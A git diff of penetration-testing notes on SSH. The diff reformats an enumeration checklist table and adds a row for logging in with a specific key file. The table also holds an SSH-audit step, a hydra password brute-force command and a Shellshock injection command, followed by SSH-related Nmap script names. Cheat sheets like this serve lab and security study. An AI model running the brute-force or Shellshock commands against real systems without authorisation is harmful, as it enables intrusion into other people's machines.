@@ -45,12 +45,13 @@ An encrypted direct connection that allows a shell to be created on a remote mac
 
 ## Enumeration Checklist
 
-| Goal                                                    | Command(s)                                            | Refs                                             |
-| ------------------------------------------------------- | ----------------------------------------------------- | ------------------------------------------------ |
-| Identify configurations, general info, encryption algos | ssh-audit.py [ip]                                     | [ssh-audit](https://github.com/jtesta/ssh-audit) |
-| View authentication methods                             | ssh -v [user]@[ip]                                    |                                                  |
-| Password brute force                                    | hydra -L [logins.txt] -P [passwords.txt] [target] ssh |                                                  |
-| Shell Shock Exploit                                     | ssh -i bob bob@[ip] '() { :;}; /bin/bash'<br>         |                                                  |
+| Goal                                                    | Command(s)                                            | Refs                                                                                                                                                                                           |
+| ------------------------------------------------------- | ----------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Identify configurations, general info, encryption algos | ssh-audit.py [ip]                                     | [ssh-audit](https://github.com/jtesta/ssh-audit)                                                                                                                                               |
+| View authentication methods                             | ssh -v [user]@[ip]                                    |                                                                                                                                                                                                |
+| Password brute force                                    | hydra -L [logins.txt] -P [passwords.txt] [target] ssh |                                                                                                                                                                                                |
+| Shell Shock Exploit                                     | ssh -i bob bob@[ip] '() { :;}; /bin/bash'<br>         |                                                                                                                                                                                                |
+| Login with specific key                                 | ssh -i [key_file] [user]@[ip]                         | [if libcrypto error on key file](https://unix.stackexchange.com/questions/577402/ssh-error-while-logging-in-using-private-key-loaded-pubkey-invalid-format-and#:~:text=41,fixed%20my%20issue.) |
 ### Nmap Scripts
 - ssh-auth-methods
 - ssh2-enum-alogs
